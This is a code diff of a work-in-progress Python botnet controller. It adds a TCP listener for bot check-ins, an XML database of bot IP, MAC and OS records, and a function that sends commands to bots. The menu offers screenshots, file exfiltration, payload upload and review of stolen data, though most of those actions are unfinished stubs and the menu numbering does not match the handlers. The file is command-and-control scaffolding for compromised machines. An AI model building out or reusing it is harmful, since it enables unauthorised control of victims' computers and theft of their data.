@@ -3,11 +3,58 @@ import threading
 from xml.dom import minidom
 
 
+# ---------- TCP Server ---------- #
+# Code example from Black Hat Python, written by Justin Seitz and published by No Starch Press
+# TCP server to accept messages from bot, runs as a thread.
+
+bind_ip = '0.0.0.0'
+bind_port = 9999
+
+# Create the socket to listen on for TCP, set the IP and port (0.0.0.0 means any I think?)
+# 5 is max backlogged connections
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((bind_ip, bind_port))
+server.listen(5)
+
+
+def handle_client(client_socket):
+    # Handles a client when the connect, called by the server, async
+
+    request = client_socket.recv(1024)  # 1024 is the buffer size
+
+    print("\n[*--> Received: %s" % request)
+
+    client_socket.send("GOT IT")  # SEND A TEST PACKET BACK
+    client_socket.close()
+
+
+# This function starts the actual server
+def the_server():
+    while True:
+        client, addr = server.accept()
+        print('\n[*--> Accepted connection from %s:%d' % (addr[0], addr[1]))
+
+        # Client thread handling for incoming data
+        client_handler = threading.Thread(target=handle_client, args=(client,))
+        client_handler.start()
+
+
+# Starts up the tcp receiver, makes it a separate thread so it can listen while being used
+server_handler = threading.Thread(target=the_server, args=())
+server_handler.start()
+
+# ---------- END OF SERVER ---------- #
+
+
+# ---------- FUNCTIONS ---------- #
 def view_bots():
     # Function to view the existing bots in database
 
+    # Open the file as XML, and get all the bots that exist
     bot_list = minidom.parse('bots.xml')
     bots = bot_list.getElementsByTagName('bot')
+
+    # Loop to print the bots
     for bot in bots:
         print('Bot %s' % bot.attributes['id'].value)
         print('--> IP: %s' % bot.attributes['ip'].value)
@@ -17,22 +64,26 @@ def view_bots():
         print('')
 
 
-def add_bot():
+def add_bot(ip, mac, os):
     # Add a bot to the database
 
+    # Open the file as XML, and get all the bots that exist
     bot_list = minidom.parse('bots.xml')
     bots = bot_list.getElementsByTagName('bot')
 
+    # Create a new bot and set it's attributes. Currently static
     new_bot = bot_list.createElement('bot')
     new_bot.setAttribute('id', str(len(bots)))
-    new_bot.setAttribute('ip', '192.168.0.%d' % len(bots))
-    new_bot.setAttribute('mac', "0xffeeddccbbaa")
-    new_bot.setAttribute('os', "WinShit%d" % len(bots))
+    new_bot.setAttribute('ip', ip)
+    new_bot.setAttribute('mac', mac)
+    new_bot.setAttribute('os', os)
 
     bot_list.getElementsByTagName('root')[0].appendChild(new_bot)
     my_file = open('bots.xml', 'w')
     my_file.write(bot_list.toxml())
     my_file.close()
+
+    print('\n*[--> Bot was added')
 
 
 def end():
@@ -55,12 +106,14 @@ def menu():
     # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
     descriptions = ['View bots',
                     'Add bot',
-                    'View Monitored Devices',  # DEPRECATE
                     'Take Screen Shot',
                     'Exfiltrate File',
                     'Upload Payload',
                     'Review Stolen Data',
                     'Exit']
+
+    # Prints the number (as num) and function name (as func) from array.
+    # Enumerate puts numbers to each list item (so num works)
     for num, func in enumerate(descriptions):
         print('[%d--> %s' % (num, func))
 
@@ -69,9 +122,8 @@ def menu():
     return choice
 
 
-def send_cmd(cmd):
-    target_host = "127.0.0.1"
-    target_port = 6660
+def send_cmd(cmd, target_host, target_port):
+    # Sends a command to a bot, invoked from other functions who's end result is pushing a command
 
     # create a socket object
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -83,33 +135,11 @@ def send_cmd(cmd):
     client.send(cmd)
 
 
-# ---------- TCP Server ---------- #
-# Code example from Black Hat Python, written by Justin Seitz and published by No Starch Press
-bind_ip = '0.0.0.0'
-bind_port = 9999
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((bind_ip, bind_port))
-server.listen(5)
-print("[*--> Listening on %s:%d\n" % (bind_ip, bind_port))
+def handle_cmd(cmd):
+    # TODO MAKE THIS SHIT WORK
+    print('')
 
-
-def handle_client(client_socket):
-    request = client_socket.recv(1024)
-
-    print("[*--> Received: %s" % request)
-
-    client_socket.send("GOT IT")  # SEND A TEST PACKET BACK
-    client_socket.close()
-
-
-def the_server():
-    while True:
-        client, addr = server.accept()
-        print('[*--> Accepted connection from %s:%d' % (addr[0], addr[1]))
-
-        # Client thread handling for incoming data
-        client_handler = threading.Thread(target=handle_client, args=(client,))
-        client_handler.start()
+# ---------- END FUNCTIONS ---------- #
 
 
 # ---------- SCRIPT LOGO ---------- #
@@ -149,39 +179,39 @@ print("     *                                                                   
 print("     *                                                                                                                                                                *")
 print("     ******************************************************************************************************************************************************************")
 
-# Starts up the tcp receiver
-server_handler = threading.Thread(target=the_server, args=())
-server_handler.start()
+# --------- END OF SCRIPT LOGO ---------- #
+
 
 # ---------- ITEM SELECTION TREE ---------- #
+print("\n[*--> Listening on %s:%d\n" % (bind_ip, bind_port))
+
+
 while True:
     select = int(menu())
 
-    if select == 0:
+    if select == 0:  # View list of bots
         view_bots()
 
-    elif select == 1:
-        add_bot()
+    elif select == 1:  # Send File
+        print('function 1')
+        # TODO MAKE THIS WORK
 
-    elif select == 2:
+    elif select == 2:  # Get File
         print('function 2')
-        send_cmd('test')
+        # TODO MAKE THIS WORK
 
-    elif select == 3:
+    elif select == 3:  # Tell bot to Screen Shot
         print('function 3')
+        # TODO MAKE THIS WORK
 
-    elif select == 4:
+    elif select == 4:  # Tell bot to Scan network
         print('function 4')
+        # TODO MAKE THIS WORK
 
-    elif select == 5:
-        print('function 5')
-
-    elif select == 6:
-        print('function 6')
-
-    elif select == 7:
+    elif select == 6:  # Exit the Script
         end()
 
     else:
         choice_error()
 
+# ---------- END OF SELECTION TREE ---------- #
